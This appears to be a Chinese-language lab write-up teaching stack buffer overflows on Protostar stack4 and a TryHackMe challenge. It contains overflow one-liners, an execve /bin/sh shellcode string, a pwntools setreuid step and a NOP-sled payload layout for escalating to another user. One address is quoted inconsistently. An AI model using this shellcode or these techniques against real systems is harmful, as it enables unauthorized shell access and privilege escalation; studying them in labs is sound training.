如果没有函数指针变量和可以修改的变量该怎么办？我们还可以执行一个函数吗？
回答：当然可以
## 6.来源于漏洞教育——>原恒星的源代码
    #include 
    #include 
    #include 
    #include 
    void win()
    {
      printf("code flow successfully changed\n");
    }
    int main(int argc, char **argv)
    {
      char buffer[64];
      gets(buffer);
    }
我们想要重定向程序的执行流程，并且执行win函数，在理想状态下它不应该会被执行。源代码中没有一个函数指针变量并且没有可修改的变量。我们可以溢出栈stack中的返回指针return
pointer，代替本地变量溢出。他将会读取错误的值并运行。
## 7.通过溢出缓冲区创造使得知道分段故障信息
    user@protostar:/opt/protostar/bin$ python -c 'print("A"*64)' | ./stack4
    user@protostar:/opt/protostar/bin$ python -c 'print("A"*70)' | ./stack4
    user@protostar:/opt/protostar/bin$ python -c 'print("A"*75)' | ./stack4
    user@protostar:/opt/protostar/bin$ python -c 'print("A"*76)' | ./stack4
    Segmentation fault
我们可以看到在76个字节之后的这个区域内覆写了指令指针，所以我们需要76个'A'和小端方式的win地址。、
    user@protostar:/opt/protostar/bin$ objdump -x stack4 | grep win
    080483f4 g     F .text 00000014              win
所以我们得到了win的地址，是'0x080486f4'。现在我们需要使用python输出76个'A'，然后是小端地址。
    user@protostar:/opt/protostar/bin$ python -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./stack4
    code flow successfully changed
    Segmentation fault
哈哈，代码执行流程被成功改变。我们执行win函数。
出现分段故障？因为在我们代码执行win函数之后，程序尝试返回下一个栈中的值。结果是一个无效的代码段。
## 8.也许此时正真的overflow才开始？
现在是时候写下我们的第一个缓冲区溢出的sheelcode，这将像你展示缓冲区溢出是多么的强大。在之前的例子中，我们看到当程序执行者控制输入，可能并不会检查长度，并且很可能恶意的用户可以覆写值和改变值。我们可以控制函数的返回去哪里并且改变程序的执行流程。我们也知道可以重定向返回地址到其他内存地址中控制执行的流程。用这些我们实际可以做哪些有用的事情？此时目的地就是“ShellCode”。
## 9.ShellCode过程
一段远程注入的具体代码，黑客用它来攻击各种各样的软件漏洞。之所以这样命名，是因为它通常会生成一个shell外壳，攻击者可以通过该shell控制受影响的系统。他是一段机器码指令，允许易受攻击的应用程序在运行中被注入有害代码。
> 下面是一个常见的过程：
>
> _➜_ 找到buffer的起始地址和返回地址的起始地址。
>
> _➜_ 分析地址之间的差距，所以就会知道输入多少数据溢出。
>
> _➜_ 首先在缓冲区中输入shellcode，在shellcode和返回地址中输入随机数据，并在返回地址中输入缓冲区的地址。
对于这个例子，我们从THM room的缓冲区溢出开始测试。注意overflow-3文件夹。
## 10.什么是challenge？
打开一个shell然后独处secret.txt文件的内容。
在这个文件夹中，你可以看到下面的C源码。
    //* buffer-overflow.c *//
    #include 
    #include 
    void copy_arg(char *string)
    {
        char buffer[140];
        strcpy(buffer, string);
        printf("%s\n", buffer);
        return 0;
    }int main(int argc, char **argv)
    {
        printf("Here's a program that echo's out your input\n");
        copy_arg(argv[1]);
    }
argv[1]是一个长度为140字节的缓冲区命令行参数，由于strcpy的性质，它不检查数据的长度。所以我们开始学习变魔术！
> 4个字节被覆写。（0x0000000041414141）
>
> 计算偏移的字节是（156-4）152字节。
在经过几次尝试后，所有的失败都带有非法指令错误，我发现了一个shellcode(40字节)。
shellcode=
‘\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05’
**cat /etc/passwd**
文件包含以下以冒号分隔的信息：
用户名，加密密码，用户ID，用户组
User name, Encrypted password, User ID number (UID), User’s group ID number
(GID).
我们可以使用pwntools来生成shellcode前缀，执行setreuid()，可以设置调用进程的真实和有效user ID。
> (1002:user)
>
> pwn shellcraft -f d amd64.linux.setreuid 1002
>
> 我们的payload长度
>
> NOP sled=90
>
> Setreuid=14
>
> Shellcode=40
>
> Random chars=8
>
> Memory address=6
>
> paylaod长度：90+14+40+8+6=158字节
用python写exploit是一种非常简单的方法。我的攻击程序如下：
让我们运行exploit，注意图中所写的从user1到user2
    ./buffer-overflow $(python exploit.py;cat)
## 11.— NB！ —
这只是一个简单的开始！
在将来，我们将会讨论下一个水平的攻击游戏。